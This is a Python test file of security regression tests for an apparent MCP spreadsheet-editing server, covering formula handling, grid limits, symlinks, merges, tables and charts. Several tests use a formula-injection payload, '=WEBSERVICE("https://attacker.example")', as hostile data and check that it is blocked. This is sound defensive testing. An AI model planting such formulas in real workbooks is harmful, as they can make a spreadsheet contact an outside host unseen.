"""Regression tests for defects found in the v1 security review."""

import asyncio
import base64
import io
import zipfile
from pathlib import Path

import pytest
from mcp import Client
from openpyxl import Workbook, load_workbook
from openpyxl.drawing.image import Image
from PIL import Image as PillowImage

from tests.conftest import ToolCall

pytestmark = pytest.mark.anyio


def _text_formula_workbook(path: Path) -> None:
    workbook = Workbook()
    sheet = workbook.worksheets[0]
    sheet.title = "Data"
    sheet.append(["Group", "Value"])
    sheet.append(['=WEBSERVICE("https://attacker.example")', 1])
    sheet["A2"].data_type = "s"
    workbook.save(path)


async def test_copied_text_stays_text(call: ToolCall, files: Path) -> None:
    _text_formula_workbook(files / "t.xlsx")
    await call("copy_range", path="t.xlsx", sheet="Data", range="A2", target_cell="D2")
    assert load_workbook(files / "t.xlsx")["Data"]["D2"].data_type == "s"


async def test_summary_text_stays_text(call: ToolCall, files: Path) -> None:
    _text_formula_workbook(files / "t.xlsx")
    await call(
        "create_summary_table",
        path="t.xlsx",
        sheet="Data",
        source_range="A1:B2",
        group_by=["Group"],
        values=[{"field": "Value"}],
        target_sheet="Data",
        target_cell="F1",
    )
    assert load_workbook(files / "t.xlsx")["Data"]["F2"].data_type == "s"


async def test_copied_formulas_are_checked(call_error: ToolCall, sample: Path, files: Path) -> None:
    workbook = load_workbook(sample)
    workbook["Data"]["E2"] = '=WEBSERVICE("https://attacker.example")'
    workbook.save(sample)
    message = await call_error(
        "copy_range", path="sales.xlsx", sheet="Data", range="E2", target_cell="E3"
    )
    assert "not allowed" in message


async def test_uploads_with_unsafe_formulas_are_rejected(call_error: ToolCall, files: Path) -> None:
    workbook = Workbook()
    workbook.worksheets[0]["A1"] = '=WEBSERVICE("https://attacker.example")'
    buffer = io.BytesIO()
    workbook.save(buffer)
    content = base64.b64encode(buffer.getvalue()).decode()
    message = await call_error("import_workbook", path="up.xlsx", content_base64=content)
    assert "not allowed" in message
    assert not (files / "up.xlsx").exists()


async def test_concurrent_edits_are_not_lost(client: Client, sample: Path) -> None:
    results = await asyncio.gather(
        *(
            client.call_tool(
                "write_range",
                {"path": "sales.xlsx", "sheet": "Report", "start_cell": f"A{row}", "rows": [[row]]},
            )
            for row in range(1, 21)
        )
    )
    assert not any(result.is_error for result in results)
    sheet = load_workbook(sample)["Report"]
    assert [sheet[f"A{row}"].value for row in range(1, 21)] == list(range(1, 21))


async def test_edits_keep_pictures(call: ToolCall, sample: Path) -> None:
    picture = io.BytesIO()
    PillowImage.new("RGB", (4, 4), "red").save(picture, format="PNG")
    workbook = load_workbook(sample)
    workbook["Report"].add_image(Image(picture), "C3")
    workbook.save(sample)

    await call("write_range", path="sales.xlsx", sheet="Report", start_cell="A1", rows=[["x"]])
    assert len(load_workbook(sample).worksheets[1]._images) == 1  # pyright: ignore[reportAttributeAccessIssue]


async def test_writes_past_the_grid_are_rejected(call_error: ToolCall, sample: Path) -> None:
    message = await call_error(
        "write_range", path="sales.xlsx", sheet="Data", start_cell="XFD1", rows=[[1, 2]]
    )
    assert "worksheet limits" in message


async def test_inserting_past_the_grid_is_rejected(call_error: ToolCall, sample: Path) -> None:
    workbook = load_workbook(sample)
    workbook["Report"]["A1048576"] = "last"
    workbook.save(sample)
    message = await call_error(
        "insert_rows_or_columns", path="sales.xlsx", sheet="Report", axis="rows", at=1
    )
    assert "past the last" in message


async def test_control_characters_are_rejected(call_error: ToolCall, sample: Path) -> None:
    message = await call_error(
        "write_range", path="sales.xlsx", sheet="Data", start_cell="A1", rows=[["a\x01b"]]
    )
    assert "control characters" in message


async def test_overlapping_merges_are_rejected(
    call: ToolCall, call_error: ToolCall, sample: Path
) -> None:
    await call("merge_cells", path="sales.xlsx", sheet="Report", range="A1:B2")
    message = await call_error("merge_cells", path="sales.xlsx", sheet="Report", range="B2:C3")
    assert "overlaps" in message


async def test_invalid_tables_are_rejected(
    call: ToolCall, call_error: ToolCall, sample: Path
) -> None:
    await call("create_table", path="sales.xlsx", sheet="Data", range="A1:D5")
    assert "overlaps" in await call_error(
        "create_table", path="sales.xlsx", sheet="Data", range="A1:B3"
    )
    assert "Invalid table name" in await call_error(
        "create_table", path="sales.xlsx", sheet="Data", range="F1:G2", name="AB12"
    )
    assert "Unknown table style" in await call_error(
        "create_table", path="sales.xlsx", sheet="Data", range="F1:G2", style="NoSuchStyle"
    )


async def test_last_visible_sheet_cannot_be_deleted(call_error: ToolCall, sample: Path) -> None:
    workbook = load_workbook(sample)
    workbook["Report"].sheet_state = "hidden"
    workbook.save(sample)
    assert "visible" in await call_error("delete_sheet", path="sales.xlsx", sheet="Data")


async def test_merged_target_cells_are_rejected(call_error: ToolCall, sample: Path) -> None:
    workbook = load_workbook(sample)
    workbook["Report"].merge_cells("A1:B1")
    workbook.save(sample)
    message = await call_error(
        "copy_range",
        path="sales.xlsx",
        sheet="Data",
        range="A1:B1",
        target_cell="A1",
        target_sheet="Report",
    )
    assert "merged" in message


async def test_chart_anchor_is_normalized(call: ToolCall, sample: Path) -> None:
    await call(
        "create_chart",
        path="sales.xlsx",
        sheet="Report",
        data_sheet="Data",
        data_range="B1:C5",
        chart_type="column",
        anchor_cell=" d5 ",
    )


async def test_find_cells_ignores_empty_grid(call: ToolCall, sample: Path) -> None:
    workbook = load_workbook(sample)
    workbook["Report"]["XFD1048576"] = "far away"
    workbook.save(sample)
    found = await call("find_cells", path="sales.xlsx", query="far", sheet="Report")
    assert found["matches"] == [{"sheet": "Report", "cell": "XFD1048576", "value": "far away"}]


async def test_list_workbooks_skips_links_outside(
    call: ToolCall, files: Path, tmp_path: Path
) -> None:
    outside = tmp_path / "outside.xlsx"
    Workbook().save(outside)
    try:
        (files / "link.xlsx").symlink_to(outside)
    except OSError:
        pytest.skip("symlinks are not available")
    assert await call("list_workbooks") == []


async def test_tables_and_sheet_filters_cannot_overlap(
    call: ToolCall, call_error: ToolCall, sample: Path
) -> None:
    await call("create_table", path="sales.xlsx", sheet="Data", range="A1:D5")
    message = await call_error(
        "set_sheet_layout", path="sales.xlsx", sheet="Data", layout={"auto_filter": "A1:D5"}
    )
    assert "own filter" in message


async def test_area_chart_axes_survive_later_edits(call: ToolCall, sample: Path) -> None:
    await call(
        "create_chart",
        path="sales.xlsx",
        sheet="Report",
        data_sheet="Data",
        data_range="B1:C5",
        chart_type="area",
        anchor_cell="B2",
    )
    await call("write_range", path="sales.xlsx", sheet="Report", start_cell="A1", rows=[["x"]])
    with zipfile.ZipFile(sample) as archive:
        chart_xml = archive.read("xl/charts/chart1.xml").decode()
    assert chart_xml.count('<c:delete val="0"') + chart_xml.count('<delete val="0"') == 2


async def test_macro_enabled_workbooks_can_be_edited(
    call: ToolCall, sample: Path, files: Path
) -> None:
    (files / "macro.xlsm").write_bytes(sample.read_bytes())
    await call("write_range", path="macro.xlsm", sheet="Report", start_cell="A1", rows=[["x"]])
    data = await call("read_range", path="macro.xlsm", sheet="Report")
    assert data["values"] == [["x"]]
